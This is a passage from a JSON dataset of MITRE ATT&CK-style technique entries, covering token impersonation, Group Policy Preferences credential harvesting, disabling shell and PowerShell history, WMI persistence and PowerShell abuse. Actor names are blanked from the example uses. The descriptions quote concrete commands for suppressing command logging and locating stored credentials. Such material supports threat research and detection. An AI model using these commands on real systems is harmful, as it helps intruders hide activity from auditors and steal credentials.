Hide GDM User Accounts) Display Managers are not anchored to specific distributions and may be changed by a user or adversary.",
    "similar_words": [
      "Hidden Users"
    ],
    "id": "T1564.002"
  },
  "attack-pattern--8cdeb020-e31e-4f88-a582-f53dcfbda819": {
    "name": "Make and Impersonate Token",
    "example_uses": [
      "can create a token for a different user.",
      "has utilized tools such as Incognito V2 for token manipulation and impersonation.",
      "can make tokens from known credentials.",
      "constructed a valid authentication token following Microsoft Exchange exploitation to allow for follow-on privileged command execution."
    ],
    "description": "Adversaries may make new tokens and impersonate users to escalate privileges and bypass access controls. For example, if an adversary has a username and password but the user is not logged onto the system the adversary can then create a logon session for the user using the `LogonUser` function.(Citation: LogonUserW function) The function will return a copy of the new session's access token and the adversary can use `SetThreadToken` to assign the token to a thread.This behavior is distinct from [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001) in that this refers to creating a new user token instead of stealing or duplicating an existing one.",
    "similar_words": [
      "Make and Impersonate Token"
    ],
    "id": "T1134.003"
  },
  "attack-pattern--8d7bd4f5-3a89-4453-9c82-2c8894d5655e": {
    "name": "Group Policy Preferences",
    "example_uses": [
      "has a module that can extract cached GPP passwords.",
      "contains a collection of Exfiltration modules that can harvest credentials from Group Policy Preferences.",
      "has used a variety of publicly available tools like Gpppassword to gather credentials.",
      "has used PowerShell cmdlets `Get-GPPPassword` and `Find-GPOPassword` to find unsecured credentials in a compromised network group policy."
    ],
    "description": "Adversaries may attempt to find unsecured credentials in Group Policy Preferences (GPP). GPP are tools that allow administrators to create domain policies with embedded credentials. These policies allow administrators to set local accounts.(Citation: Microsoft GPP 2016)These group policies are stored in SYSVOL on a domain controller. This means that any domain user can view the SYSVOL share and decrypt the password (using the AES key that has been made public).(Citation: Microsoft GPP Key)The following tools and scripts can be used to gather and decrypt the password file from Group Policy Preference XML files:* Metasploits post exploitation module: post/windows/gather/credentials/gpp* Get-GPPPassword(Citation: Obscuresecurity Get-GPPPassword)* gpprefdecrypt.pyOn the SYSVOL share, adversaries may use the following command to enumerate potential GPP XML files: dir /s * .xml",
    "similar_words": [
      "Group Policy Preferences"
    ],
    "id": "T1552.006"
  },
  "attack-pattern--8e350c1d-ac79-4b5c-bd4e-7476d7e84ec5": {
    "name": "Exfiltration Over Asymmetric Encrypted Non-C2 Protocol",
    "example_uses": [
      "has exfiltrated archives of collected data previously staged on a target's OWA server via HTTPS.",
      "can exfiltrate data over SFTP or HTTPS via WebDAV.",
      "During the   exfiltrated collected data over a simple HTTPS request to a password-protected archive staged on a victim's OWA servers.",
      "has exfiltrated collected data via HTTPS.",
      "has used SMTPS to exfiltrate collected data from victims.",
      "has exfiltrated captured user credentials via Secure Copy Protocol (SCP)."
    ],
    "description": "Adversaries may steal data by exfiltrating it over an asymmetrically encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server. Asymmetric encryption algorithms are those that use different keys on each end of the channel. Also known as public-key cryptography, this requires pairs of cryptographic keys that can encrypt/decrypt data from the corresponding key. Each end of the communication channels requires a private key (only in the procession of that entity) and the public key of the other entity. The public keys of each entity are exchanged before encrypted communications begin. Network protocols that use asymmetric encryption (such as HTTPS/TLS/SSL) often utilize symmetric encryption once keys are exchanged. Adversaries may opt to use these encrypted mechanisms that are baked into a protocol. ",
    "similar_words": [
      "Exfiltration Over Asymmetric Encrypted Non-C2 Protocol"
    ],
    "id": "T1048.002"
  },
  "attack-pattern--8f104855-e5b7-4077-b1f5-bc3103b41abe": {
    "name": "Cloud Account",
    "example_uses": [
      "During   accessed Azure AD to download bulk lists of group members and to identify privileged users along with the email addresses and AD attributes.",
      "can enumerate Azure AD users.",
      "can enumerate Azure AD users.",
      "has conducted enumeration of Azure AD accounts.",
      "can enumerate IAM users roles and groups."
    ],
    "description": "Adversaries may attempt to get a listing of cloud accounts. Cloud accounts are those created and configured by an organization for use by users, remote support, services, or for administration of resources within a cloud service provider or SaaS application.With authenticated access there are several tools that can be used to find accounts. The Get-MsolRoleMember PowerShell cmdlet can be used to obtain account names given a role or permissions group in Office 365.(Citation: Microsoft msolrolemember)(Citation: GitHub Raindance) The Azure CLI (AZ CLI) also provides an interface to obtain user accounts with authenticated access to a domain. The command az ad user list will list all users within a domain.(Citation: Microsoft AZ CLI)(Citation: Black Hills Red Teaming MS AD Azure, 2018) The AWS command aws iam list-users may be used to obtain a list of users in the current account while aws iam list-roles can obtain IAM roles that have a specified path prefix.(Citation: AWS List Roles)(Citation: AWS List Users) In GCP, gcloud iam service-accounts list and gcloud projects get-iam-policy may be used to obtain a listing of service accounts and users in a project.(Citation: Google Cloud - IAM Servie Accounts List API)",
    "similar_words": [
      "Cloud Account"
    ],
    "id": "T1087.004"
  },
  "attack-pattern--8f504411-cb96-4dac-a537-8d2bb7679c59": {
    "name": "Impair Command History Logging",
    "example_uses": [
      "has prepended a space to all of their terminal commands to operate without leaving traces in the HISTCONTROL environment.",
      "can bypass ScriptBlock logging to execute unmanaged PowerShell code from memory.",
      "sets the `MYSQL_HISTFILE` and `HISTFILE` to `/dev/null` preventing the shell and MySQL from logging history in `/proc/<PID>/environ`.",
      "can disable syslog on compromised devices.",
      "unset the Bash and MySQL history files on victim systems.",
      "included disabling logging on targeted Cisco ASA appliances."
    ],
    "description": "Adversaries may impair command history logging to hide commands they run on a compromised system. Various command interpreters keep track of the commands users type in their terminal so that users can retrace what they've done. On Linux and macOS, command history is tracked in a file pointed to by the environment variable HISTFILE. When a user logs off a system, this information is flushed to a file in the user's home directory called ~/.bash_history. The HISTCONTROL environment variable keeps track of what should be saved by the history command and eventually into the ~/.bash_history file when a user logs out. HISTCONTROL does not exist by default on macOS, but can be set by the user and will be respected. The `HISTFILE` environment variable is also used in some ESXi systems.(Citation: Google Cloud Threat Intelligence ESXi VIBs 2022)Adversaries may clear the history environment variable (unset HISTFILE) or set the command history size to zero (export HISTFILESIZE=0) to prevent logging of commands. Additionally, HISTCONTROL can be configured to ignore commands that start with a space by simply setting it to \"ignorespace\". HISTCONTROL can also be set to ignore duplicate commands by setting it to \"ignoredups\". In some Linux systems, this is set by default to \"ignoreboth\" which covers both of the previous examples. This means that  ls will not be saved, but ls would be saved by history. Adversaries can abuse this to operate without leaving traces by simply prepending a space to all of their terminal commands. On Windows systems, the PSReadLine module tracks commands used in all PowerShell sessions and writes them to a file ($env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt by default). Adversaries may change where these logs are saved using Set-PSReadLineOption -HistorySavePath {File Path}. This will cause ConsoleHost_history.txt to stop receiving logs. Additionally, it is possible to turn off logging to this file using the PowerShell command Set-PSReadlineOption -HistorySaveStyle SaveNothing.(Citation: Microsoft PowerShell Command History)(Citation: Sophos PowerShell command audit)(Citation: Sophos PowerShell Command History Forensics)Adversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to disable historical command logging (e.g. no logging).",
    "similar_words": [
      "Impair Command History Logging"
    ],
    "id": "T1562.003"
  },
  "attack-pattern--90c4a591-d02d-490b-92aa-619d9701ac04": {
    "name": "Network Provider DLL",
    "example_uses": [],
    "description": "Adversaries may register malicious network provider dynamic link libraries (DLLs) to capture cleartext user credentials during the authentication process. Network provider DLLs allow Windows to interface with specific network protocols and can also support add-on credential management functions.(Citation: Network Provider API) During the logon process, Winlogon (the interactive logon module) sends credentials to the local `mpnotify.exe` process via RPC. The `mpnotify.exe` process then shares the credentials in cleartext with registered credential managers when notifying that a logon event is happening.(Citation: NPPSPY - Huntress)(Citation: NPPSPY Video)(Citation: NPLogonNotify) Adversaries can configure a malicious network provider DLL to receive credentials from `mpnotify.exe`.(Citation: NPPSPY) Once installed as a credential manager (via the Registry), a malicious DLL can receive and save credentials each time a user logs onto a Windows workstation or domain via the `NPLogonNotify()` function.(Citation: NPLogonNotify)Adversaries may target planting malicious network provider DLLs on systems known to have increased logon activity and/or administrator logon activity, such as servers and domain controllers.(Citation: NPPSPY - Huntress)",
    "similar_words": [
      "Network Provider DLL"
    ],
    "id": "T1556.008"
  },
  "attack-pattern--910906dd-8c0a-475a-9cc1-5e029e2fad58": {
    "name": "Windows Management Instrumentation Event Subscription",
    "example_uses": [
      "has used mofcomp.exe to establish WMI Event Subscription persistence mechanisms configured from a *.mof file.",
      "can use a WMI event filter to invoke a command-line event consumer to gain persistence.",
      "has used WMI event subscriptions for persistence.",
      "registered a WMI event subscription consumer called hard_disk_stat to establish persistence.",
      "has used WMI event subscriptions for persistence.",
      "has used WMI event subscriptions for persistence.",
      "can persist using a WMI consumer that is launched every time a process named WINWORD.EXE is started.",
      "can create a WMI Event to execute a payload for persistence.",
      "has used WMI for persistence.",
      "can use WMI event subscriptions to create persistence.",
      "During the   used a WMI event filter to invoke a command-line event consumer at system boot time to launch a backdoor with `rundll32.exe`.",
      "has used WMI event filters and consumers to establish persistence.",
      "has established persistence through the use of a WMI event subscription combined with unusual living-off-the-land binaries such as `cdb.exe`.",
      "has attempted to use WMI event subscriptions to establish persistence on compromised hosts.",
      "can use WMI event subscriptions for persistence.",
      "can compile randomly-generated MOF files into the WMI repository to persistently run malware.",
      "During   used WMI event subscriptions to establish persistence for malware.",
      "custom ORat tool uses a WMI event consumer to maintain persistence.",
      "can use a WMI script to achieve persistence.",
      "has complied VBScript-generated MOF files into WMI event subscriptions for persistence.",
      "uses an event filter in WMI code to execute a previously dropped executable shortly after system startup.",
      "uses a WMI event subscription to establish persistence.",
      "has the ability to persist on a system using WMI events.",
      "has the ability to use WMI for persistence.",
      "can use WMI for persistence."
    ],
    "description": "Adversaries may establish persistence and elevate privileges by executing malicious content triggered by a Windows Management Instrumentation (WMI) event subscription. WMI can be used to install event filters, providers, consumers, and bindings that execute code when a defined event occurs. Examples of events that may be subscribed to are the wall clock time, user login, or the computer's uptime.(Citation: Mandiant M-Trends 2015)Adversaries may use the capabilities of WMI to subscribe to an event and execute arbitrary code when that event occurs, providing persistence on a system.(Citation: FireEye WMI SANS 2015)(Citation: FireEye WMI 2015) Adversaries may also compile WMI scripts  using `mofcomp.exe`  into Windows Management Object (MOF) files (.mof extension) that can be used to create a malicious subscription.(Citation: Dell WMI Persistence)(Citation: Microsoft MOF May 2018)WMI subscription execution is proxied by the WMI Provider Host process (WmiPrvSe.exe) and thus may result in elevated SYSTEM privileges.",
    "similar_words": [
      "Windows Management Instrumentation Event Subscription"
    ],
    "id": "T1546.003"
  },
  "attack-pattern--91177e6d-b616-4a03-ba4b-f3b32f7dda75": {
    "name": "CDNs",
    "example_uses": [],
    "description": "Adversaries may search content delivery network (CDN) data about victims that can be used during targeting. CDNs allow an organization to host content from a distributed, load balanced array of servers. CDNs may also allow organizations to customize content delivery based on the requestors geographical region.Adversaries may search CDN data to gather actionable information. Threat actors can use online resources and lookup tools to harvest information about content servers within a CDN. Adversaries may also seek and target CDN misconfigurations that leak sensitive information not intended to be hosted and/or do not have the same protection mechanisms (ex: login portals) as the content hosted on the organizations website.(Citation: DigitalShadows CDN) Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [Drive-by Compromise](https://attack.mitre.org/techniques/T1189)).",
    "similar_words": [
      "CDNs"
    ],
    "id": "T1596.004"
  },
  "attack-pattern--91541e7e-b969-40c6-bbd8-1b5352ec2938": {
    "name": "User Activity Based Checks",
    "example_uses": [
      "has used malware that repeatedly checks the mouse cursor position to determine if a real user is on the system.",
      "loader only executes the payload after the left mouse button has been pressed at least three times in order to avoid being executed within virtualized or emulated environments.",
      "used images embedded into document lures that only activate the payload when a user double clicks to avoid sandboxes.",
      "has used a splash screen to check whether an user actively clicks on the screen before running malicious code."
    ],
    "description": "Adversaries may employ various user activity checks to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) during automated discovery to shape follow-on behaviors.(Citation: Deloitte Environment Awareness)Adversaries may search for user activity on the host based on variables such as the speed/frequency of mouse movements and clicks (Citation: Sans Virtual Jan 2016) , browser history, cache, bookmarks, or number of files in common directories such as home or the desktop. Other methods may rely on specific user interaction with the system before the malicious code is activated, such as waiting for a document to close before activating a macro (Citation: Unit 42 Sofacy Nov 2018) or waiting for a user to double click on an embedded image to activate.(Citation: FireEye FIN7 April 2017) ",
    "similar_words": [
      "User Activity Based Checks"
    ],
    "id": "T1497.002"
  },
  "attack-pattern--926d8cfd-1d0d-4da2-ab49-3ca10ec3f3b5": {
    "name": "Cloud Accounts",
    "example_uses": [
      "has created malicious accounts to enable activity via Microsoft Teams typically spoofing various IT support and helpdesk themes.",
      "During   created M365 email accounts to be used as part of C2."
    ],
    "description": "Adversaries may create accounts with cloud providers that can be used during targeting. Adversaries can use cloud accounts to further their operations, including leveraging cloud storage services such as Dropbox, MEGA, Microsoft OneDrive, or AWS S3 buckets for [Exfiltration to Cloud Storage](https://attack.mitre.org/techniques/T1567/002) or to [Upload Tool](https://attack.mitre.org/techniques/T1608/002)s. Cloud accounts can also be used in the acquisition of infrastructure, such as [Virtual Private Server](https://attack.mitre.org/techniques/T1583/003)s or [Serverless](https://attack.mitre.org/techniques/T1583/007) infrastructure. Establishing cloud accounts may allow adversaries to develop sophisticated capabilities without managing their own servers.(Citation: Awake Security C2 Cloud)Creating [Cloud Accounts](https://attack.mitre.org/techniques/T1585/003) may also require adversaries to establish [Email Accounts](https://attack.mitre.org/techniques/T1585/002) to register with the cloud provider. ",
    "similar_words": [
      "Cloud Accounts"
    ],
    "id": "T1585.003"
  },
  "attack-pattern--93591901-3172-4e94-abf8-6034ab26f44a": {
    "name": "Parent PID Spoofing",
    "example_uses": [
      "has used parent PID spoofing to spawn a new `cmd` process using `CreateProcessW` and a handle to `Taskmgr.exe`.",
      "can spawn processes with alternate PPIDs.",
      "can use parent PID spoofing to elevate privileges.",
      "relies on parent PID spoofing as part of its rootkit-like functionality to evade detection via Task Manager or Process Explorer."
    ],
    "description": "Adversaries may spoof the parent process identifier (PPID) of a new process to evade process-monitoring defenses or to elevate privileges. New processes are typically spawned directly from their parent, or calling, process unless explicitly specified. One way of explicitly assigning the PPID of a new process is via the CreateProcess API call, which supports a parameter that defines the PPID to use.(Citation: DidierStevens SelectMyParent Nov 2009) This functionality is used by Windows features such as User Account Control (UAC) to correctly set the PPID after a requested elevated process is spawned by SYSTEM (typically via svchost.exe or consent.exe) rather than the current user context.(Citation: Microsoft UAC Nov 2018)Adversaries may abuse these mechanisms to evade defenses, such as those blocking processes spawning directly from Office documents, and analysis targeting unusual/potentially malicious parent-child process relationships, such as spoofing the PPID of [PowerShell](https://attack.mitre.org/techniques/T1059/001)/[Rundll32](https://attack.mitre.org/techniques/T1218/011) to be explorer.exe rather than an Office document delivered as part of [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001).(Citation: CounterCept PPID Spoofing Dec 2018) This spoofing could be executed via [Visual Basic](https://attack.mitre.org/techniques/T1059/005) within a malicious Office document or any code that can perform [Native API](https://attack.mitre.org/techniques/T1106).(Citation: CTD PPID Spoofing Macro Mar 2019)(Citation: CounterCept PPID Spoofing Dec 2018)Explicitly assigning the PPID may also enable elevated privileges given appropriate access rights to the parent process. For example, an adversary in a privileged user context (i.e. administrator) may spawn a new process and assign the parent as a process running as SYSTEM (such as lsass.exe), causing the new process to be elevated via the inherited access token.(Citation: XPNSec PPID Nov 2017)",
    "similar_words": [
      "Parent PID Spoofing"
    ],
    "id": "T1134.004"
  },
  "attack-pattern--937e4772-8441-4e4a-8bf0-8d447d667e23": {
    "name": "Gather Victim Org Information",
    "example_uses": [
      "has studied publicly available information about a targeted organization to tailor spearphishing efforts against specific departments and/or individuals.",
      "For   gathered victim organization information to identify specific targets.",
      "has collected victim organization information including but not limited to organization hierarchy functions press releases and others.",
      "has gathered information on victim organizations through email and social media interaction.",
      "has conducted extensive reconnaissance pre-compromise to gain information about the targeted organization.",
      "has used large language models (LLMs) to gather information about satellite capabilities.",
      "has collected victim organization information including but not limited to organization hierarchy functions press releases and others.  has also used large language models (LLMs) to gather information about potential targets of interest."
    ],
    "description": "Adversaries may gather information about the victim's organization that can be used during targeting. Information about an organization may include a variety of details, including the names of divisions/departments, specifics of business operations, as well as the roles and responsibilities of key employees.Adversaries may gather this information in various ways, such as direct elicitation via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about an organization may also be exposed to adversaries via online or other accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).(Citation: ThreatPost Broadvoice Leak)(Citation: SEC EDGAR Search) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [Phishing](https://attack.mitre.org/techniques/T1566) or [Trusted Relationship](https://attack.mitre.org/techniques/T1199)).",
    "similar_words": [
      "Gather Victim Org Information"
    ],
    "id": "T1591"
  },
  "attack-pattern--94cb00a4-b295-4d06-aa2b-5653b9c1be9c": {
    "name": "Forge Web Credentials",
    "example_uses": [],
    "description": "Adversaries may forge credential materials that can be used to gain access to web applications or Internet services. Web applications and services (hosted in cloud SaaS environments or on-premise servers) often use session cookies, tokens, or other materials to authenticate and authorize user access.Adversaries may generate these credential materials in order to gain access to web resources. This differs from [Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539), [Steal Application Access Token](https://attack.mitre.org/techniques/T1528), and other similar behaviors in that the credentials are new and forged by the adversary, rather than stolen or intercepted from legitimate users.The generation of web credentials often requires secret values, such as passwords, [Private Keys](https://attack.mitre.org/techniques/T1552/004), or other cryptographic seed values.(Citation: GitHub AWS-ADFS-Credential-Generator) Adversaries may also forge tokens by taking advantage of features such as the `AssumeRole` and `GetFederationToken` APIs in AWS, which allow users to request temporary security credentials (i.e., [Temporary Elevated Cloud Access](https://attack.mitre.org/techniques/T1548/005)), or the `zmprov gdpak` command in Zimbra, which generates a pre-authentication key that can be used to generate tokens for any user in the domain.(Citation: AWS Temporary Security Credentials)(Citation: Zimbra Preauth)Once forged, adversaries may use these web credentials to access resources (ex: [Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550)), which may bypass multi-factor and other authentication protection mechanisms.(Citation: Pass The Cookie)(Citation: Unit 42 Mac Crypto Cookies January 2019)(Citation: Microsoft SolarWinds Customer Guidance)  ",
    "similar_words": [
      "Forge Web Credentials"
    ],
    "id": "T1606"
  },
  "attack-pattern--954a1639-f2d6-407d-aef3-4917622ca493": {
    "name": "Multi-Factor Authentication Request Generation",
    "example_uses": [
      "has used repeated MFA requests to gain access to victim accounts.",
      "During   attempted to gain access by continuously sending MFA messages to the victim until they accept the MFA push challenge.",
      "has used multifactor authentication (MFA) fatigue by sending repeated MFA authentication requests to targets.",
      "has spammed target users with MFA prompts in the hope that the legitimate user will grant necessary approval."
    ],
    "description": "Adversaries may attempt to bypass multi-factor authentication (MFA) mechanisms and gain access to accounts by generating MFA requests sent to users.Adversaries in possession of credentials to [Valid Accounts](https://attack.mitre.org/techniques/T1078) may be unable to complete the login process if they lack access to the 2FA or MFA mechanisms required as an additional credential and security control. To circumvent this, adversaries may abuse the automatic generation of push notifications to MFA services such as Duo Push, Microsoft Authenticator, Okta, or similar services to have the user grant access to their account. If adversaries lack credentials to victim accounts, they may also abuse automatic push notification generation when this option is configured for self-service password reset (SSPR).(Citation: Obsidian SSPR Abuse 2023)In some cases, adversaries may continuously repeat login attempts in order to bombard users with MFA push notifications, SMS messages, and phone calls, potentially resulting in the user finally accepting the authentication request in response to MFA fatigue.(Citation: Russian 2FA Push Annoyance - Cimpanu)(Citation: MFA Fatigue Attacks - PortSwigger)(Citation: Suspected Russian Activity Targeting Government and Business Entities Around the Globe)",
    "similar_words": [
      "Multi-Factor Authentication Request Generation"
    ],
    "id": "T1621"
  },
  "attack-pattern--960c3c86-1480-4d72-b4e0-8c242e84a5c5": {
    "name": "Compromise Host Software Binary",
    "example_uses": [
      "can embed itself into a legitimate file on compromised Ivanti Connect Secure VPNs.",
      "has used a Trojanized version of the Windows Notepad application for an additional backdoor persistence mechanism.",
      "During  threat actors trojanized legitimate files in Ivanti Connect Secure appliances with malicious code.",
      "can embed into the legitimate `querymanifest.cgi` file on compromised Ivanti Connect Secure VPNs.",
      "replaced the SSH client with a trojanized SSH client to steal credentials on compromised systems.",
      "has modified legitimate binaries and scripts for Pulse Secure VPNs including the legitimate DSUpgrade.pm file to install the ATRIUM webshell for persistence.",
      "has maliciously altered the OpenSSH binary on targeted systems to create a backdoor.",
      "searches through the /Users/ folder looking for executable files. For each executable  prepends a copy of itself to the beginning of the file. When the file is executed the  code is executed first.  creates a hidden file copies the original target executable to the file then executes the new hidden file to maintain the appearance of normal behavior.",
      "can append malicious components to the `tmp/tmpmnt/bin/samba_upgrade.tar` archive inside the factory reset partition in attempt to persist post reset.",
      "has been embedded into modified OpenSSH binaries to gain persistent access to SSH credential information.",
      "can imbed itself into the legitimate `compcheckresult.cgi` component of Ivanti Connect Secure VPNs to enable command execution.",
      "has maliciously altered the OpenSSH binary on targeted systems to create a backdoor.",
      "uses a malicious browser application to replace the legitimate browser in order to continuously capture credentials monitor web traffic and download additional modules.",
      "During the   used a trojanized version of Windows Notepad to add a layer of persistence for .",
      "can embed itself in the CAV Python package of an Ivanti Connect Secure VPN located in `/home/venv3/lib/python3.6/site-packages/cav-0.1-py3.6.egg/cav/api/resources/category.py.`",
      "is applied in compromised environments through modifications to legitimate Pulse Secure files.",
      "can modify the `visits.py` component of Ivanti Connect Secure VPNs for file download and arbitrary command execution.",
      "uses DLL unhooking to remove user mode inline hooks that security solutions often implement.  also uses IAT unhooking to remove user-mode IAT hooks that security solutions also use.",
      "modifies the `keyutils` library to add malicious behavior to the OpenSSH client and the curl library.",
      "contains a watchdog-like feature that monitors a particular file for modification. If modification is detected the legitimate file is backed up and replaced with a trojanized file to allow for persistence through likely system upgrades."
    ],
    "description": "Adversaries may modify host software binaries to establish persistent access to systems. Software binaries/executables provide a wide range of system commands or services, programs, and libraries. Common software binaries are SSH clients, FTP clients, email clients, web browsers, and many other user or server applications.Adversaries may establish persistence though modifications to host software binaries. For example, an adversary may replace or otherwise infect a legitimate application binary (or support files) with a backdoor. Since these binaries may be routinely executed by applications or the user, the adversary can leverage this for persistent access to the host. An adversary may also modify a software binary such as an SSH client in order to persistently collect credentials during logins (i.e., [Modify Authentication Process](https://attack.mitre.org/techniques/T1556)).(Citation: Google Cloud Mandiant UNC3886 2024)An adversary may also modify an existing binary by patching in malicious functionality (e.g., IAT Hooking/Entry point patching)(Citation: Unit42 Banking Trojans Hooking 2022) prior to the binarys legitimate execution. For example, an adversary may modify the entry point of a binary to point to malicious code patched in by the adversary before resuming normal execution flow.(Citation: ESET FontOnLake Analysis 2021)After modifying a binary, an adversary may attempt to [Impair Defenses](https://attack.mitre.org/techniques/T1562) by preventing it from updating (e.g., via the `yum-versionlock` command or `versionlock.list` file in Linux systems that use the yum package manager).(Citation: Google Cloud Mandiant UNC3886 2024)",
    "similar_words": [
      "Compromise Host Software Binary"
    ],
    "id": "T1554"
  },
  "attack-pattern--9664ad0e-789e-40ac-82e2-d7b17fbe8fb3": {
    "name": "Chat Messages",
    "example_uses": [
      "has targeted various collaboration tools like Slack Teams JIRA Confluence and others to hunt for exposed credentials to support privilege escalation and lateral movement."
    ],
    "description": "Adversaries may directly collect unsecured credentials stored or passed through user communication services. Credentials may be sent and stored in user chat communication applications such as email, chat services like Slack or Teams, collaboration tools like Jira or Trello, and any other services that support user communication. Users may share various forms of credentials (such as usernames and passwords, API keys, or authentication tokens) on private or public corporate internal communications channels.Rather than accessing the stored chat logs (i.e., [Credentials In Files](https://attack.mitre.org/techniques/T1552/001)), adversaries may directly access credentials within these services on the user endpoint, through servers hosting the services, or through administrator portals for cloud hosted services. Adversaries may also compromise integration tools like Slack Workflows to automatically search through messages to extract user credentials. These credentials may then be abused to perform follow-on activities such as lateral movement or privilege escalation (Citation: Slack Security Risks).",
    "similar_words": [
      "Chat Messages"
    ],
    "id": "T1552.008"
  },
  "attack-pattern--970a3432-3237-47ad-bcca-7d8cbb217736": {
    "name": "PowerShell",
    "example_uses": [
      "has used PowerShell for script execution.",
      "has used PowerShell to accomplish tasks within targeted environments.",
      "During the   used PowerShell scripts to run a credential harvesting tool in memory to evade defenses.",
      "has used PowerShell reverse TCP shells to issue interactive commands over a network connection.",
      "can utilize `powershell.exe` to execute commands on a compromised host.",
      "leverages PowerShell for the majority of its client-side agent tasks.  also contains the ability to conduct PowerShell remoting with the Invoke-PSRemoting module.",
      "uses PowerShell to download and execute the payload.",
      "has used PowerShell to execute malicious code.",
      "has used PowerShell for execution and privilege escalation.",
      "can use PowerShell to download and execute payloads.",
      "used PowerShell commands to execute payloads.",
      "has the ability to execute its payload via PowerShell.",
      "downloads and executes PowerShell scripts and performs PowerShell commands.",
      "leveraged PowerShell to deploy malware families in victims environments.",
      "has used PowerShell scripts to run a credential harvesting tool in memory to evade defenses.",
      "has used PowerShell to delete volume shadow copies and download files.",
      "has used plugins to execute PowerShell scripts.",
      "can execute a PowerShell script received from C2.",
      "During the   utilized a PowerShell utility called TANKTRAP to spread and launch a wiper using Windows Group Policy.",
      "has used PowerShell Empire.",
      "can execute PowerShell commands and scripts with the use of .NET DLL `WoodyPowerSession`.",
      "has a module for loading and executing PowerShell scripts.",
      "can execute PowerShell scripts received from C2.",
      "leveraged PowerShell to run commands to download payloads traverse the compromised networks and carry out reconnaissance.",
      "can use PowerShell to support multiple actions including execution and defense evasion.",
      "uses PowerShell loops to iteratively check for available commands in its OneDrive C2 server.",
      "has used PowerShell to execute payloads.",
      "has been known to use PowerShell to download new payloads open documents and upload data to command and control servers.",
      "has used PowerShell commands to obtain DNS data from a compromised network.",
      "malware can use PowerShell commands to download and execute a payload and open a decoy document on the victims machine.",
      "can use PowerShell to set persistence.",
      "will execute PowerShell commands to delete system volume shadow copies.",
      "During   used PowerShell commands to explore the environment of compromised victims.",
      "can execute PowerShell commands and has used PowerShell to execute a keylogger.",
      "can use PowerShell for command execution.",
      "is a backdoor written in PowerShell.",
      "used a PowerShell script to launch shellcode that retrieved an additional payload.",
      "can use a PowerShell script to execute commands.",
      "can execute PowerShell commands on a compromised machine.",
      "During  the threat actors used PowerShell to run a series of Base64-encoded commands that acted as a stager and enumerated hosts.",
      "has used PowerShell to download and execute malicious code.",
      "has executed PowerShell commands in batch scripts.",
      "has used PowerShell scripts for execution including use of a macro to run a PowerShell command to decode file contents.",
      "The  binary has been executed via PowerShell script.",
      "has the ability to execute through PowerShell.",
      "is written in PowerShell.",
      "can launch PowerShell Scripts.",
      "has used PowerShell to execute commands.",
      "has used PowerShell to execute malicious commands and payloads.",
      "has been dropped onto systems and used for lateral movement via obfuscated PowerShell scripts.",
      "One version of  uses a PowerShell script.",
      "can utilize a PowerShell loader.",
      "has used Powershell scripts to deploy its ransomware.",
      "has used PowerShell to execute commands and malicious code.",
      "can execute arbitrary commands with PowerShell.",
      "has used PowerShell-based tools PowerShell one-liners and shellcode loaders for execution.",
      "has used PowerShell scripts to execute malicious payloads and the DSInternals PowerShell module to make use of Active Directory features.",
      "has used PowerShell to establish persistence.",
      "has used PowerShell including for remote system discovery.",
      "has executed PowerShell commands via auto-run registry key persistence.",
      "has used PowerShell to execute commands.",
      "has used PowerShell to execute commands.",
      "has used PowerShell for execution.",
      "has used PowerShell to download files and to inject into various Windows processes.",
      "has used PowerShell scripts to download and execute programs in memory without writing to disk.",
      "has used PowerShell  for execution of malware.",
      "has used powershell.exe to download and execute scripts.",
      "has used PowerShell for execution.",
      "can execute a payload on a remote host with PowerShell. This technique does not write any data to disk.  can also use  and other scripting frameworks to perform execution.",
      "has used macros to execute PowerShell scripts to download malware on victim's machines. It has also used PowerShell to execute commands and move laterally through a victim network.",
      "used PowerShell to download and execute a specific 64-bit version of the malware.",
      "can write and execute PowerShell scripts.",
      "During  the threat actors used encoded PowerShell scripts for execution.",
      "has used Powershell to retrieve the malicious payload and download additional resources like .",
      "has used encoded PowerShell scripts uploaded to  installations to download and install .",
      "has used PowerShell for execution.",
      "can use PowerShell to download files and execute commands.",
      "can extract and execute PowerShell scripts from C2 communications.",
      "used PowerShell for execution to assist in lateral movement as well as for dumping credentials stored on compromised machines.",
      "can use PowerShell for payload execution and C2 communication.",
      "can use PowerShell commands to disable the network adapters on a victim machines.",
      "can use PowerShell to execute commands.",
      "is a PowerShell backdoor.",
      "has the ability to execute a PowerShell script to get information from the infected host.",
      "can use scripts to invoke PowerShell to download a malicious PE executable or PE DLL for execution.",
      "droppers have used PowerShell in download cradles to download and execute the malware's full executable payload.",
      "uses PowerShell to execute various commands one to execute its payload.",
      "has used  scripts.",
      "has the ability to employ a custom PowerShell script.",
      "can be used to execute PowerShell commands on target machines.",
      "uses PowerShell for obfuscation and execution.",
      "has used PowerShell scripts for discovery and to execute files over the network.",
      "can use PowerShell to add files to the Windows Defender exclusions list.",
      "During the   used PowerShell to create new tasks on remote machines identify configuration settings exfiltrate data and execute other commands.",
